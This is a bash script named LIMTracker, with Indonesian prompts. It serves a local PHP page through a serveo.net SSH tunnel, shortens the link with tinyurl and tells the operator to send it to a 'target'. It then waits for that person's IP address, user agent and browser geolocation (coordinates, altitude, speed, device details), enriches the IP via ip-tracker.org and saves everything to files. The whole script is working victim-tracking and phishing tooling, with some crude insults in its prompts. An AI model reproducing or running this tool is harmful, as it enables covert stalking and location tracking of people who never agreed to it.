#!/bin/bash
clear
trap 'printf "\n";stop;exit 1' 2

banner(){
echo -e "\033[1;32m"
figlet -f standard "LIMTracker"
}

cek() {

command -v php > /dev/null 2>&1 || { echo >&2 "php belum di install, ketik > pkg install php -y"; exit 1; }
command -v figlet > /dev/null 2>&1 || { echo >&2 "figlet belum di install, ketik > pkg install figlet -y"; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "curl belum di install, ketik > pkg install curl -y"; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh belum terinstall silahkakn  ketik > pkg install openssh -y"; exit 1; }


}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

catch_cred() {

longitude=$(grep -o 'Longitude:.*' limit/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' limit/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Info Lokasi:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $latitude $longitude
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Info Hp Target:\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
cat limit/geolocate.txt >> limit/saved.geolocate.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m limit/saved.geolocate.txt\e[0m\n" 
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}


getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu lokasi terambil ...\e[0m\n"
while [ true ]; do


if [[ -e "limit/geolocate.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Lokasi di temukan!\n"
catch_cred

fi
sleep 0.5
if [[ -e "limit/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Lokasi tidak di temukan:(!\n"
checkerror=$(grep -o 'Error:.*' limit/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target tidak membagikan lokasinya ...\e[0m\n"

rm -rf limit/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Lokasi tidak tersedia ...\e[0m\n"

rm -rf limit/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Time Out ...\e[0m\n"

rm -rf limit/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Unknow Error ...\e[0m\n"

rm -rf limit/error.txt
getcredentials
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error membaca file error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5

done 


}



catch_ip() {
touch limit/saved.geolocate.txt
ip=$(grep -a 'IP:' limit/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' limit/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m limit/saved.ip.txt\e[0m\n"
cat limit/ip.txt >> limit/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Negara:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Negara:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "Lokasi Kota:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] Lokasi Kota:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}
checkfound() {

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Menunggu target membuka link ...\e[0m\n"
while [ true ]; do


if [[ -e "limit/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Ditemukan!\n"
catch_ip

fi
sleep 1
done 

}

serverx() {

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "limit/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh belum terinstall silahkakn  ketik > pkg install openssh -y"; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$sub':80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
printf "\n"
sleep 4 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Kirimkan Link Ini ke target:\e[0m\e[1;77m %s \n' $send_link
printf '\n'
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"


checkfound

}

startx() {

if [[ -e limit/ip.txt ]]; then
rm -rf limit/ip.txt

fi
if [[ -e limit/geolocate.txt ]]; then
rm -rf limit/geolocate.txt

fi

if [[ -e limit/error.txt ]]; then
rm -rf limit/error.txt

fi

subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Masukan Subdomain: (Contoh:\e[0m\e[1;77m LimitQueen \e[0m\e[1;33m): \e[0m'
read sub
#$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Masukan Port (Default:\e[0m\e[1;77m 4444 \e[0m\e[1;92m): \e[0m'
read port

serverx

}
start1() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunelling, Best!)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == 1 || $option_server == 01 ]]; then
startx

elif [[ $option_server == 2 || $option_server == 02 ]]; then
clear
banner
echo ""
echo -e "\033[0;36mSabar woey belom rilis jir males ngoding"
sleep 3
start1
else
printf "\e[1;93m [!] Pilih yang ada asu!\e[0m\n"
sleep 1
clear
start1
fi

}



banner
cek
start1
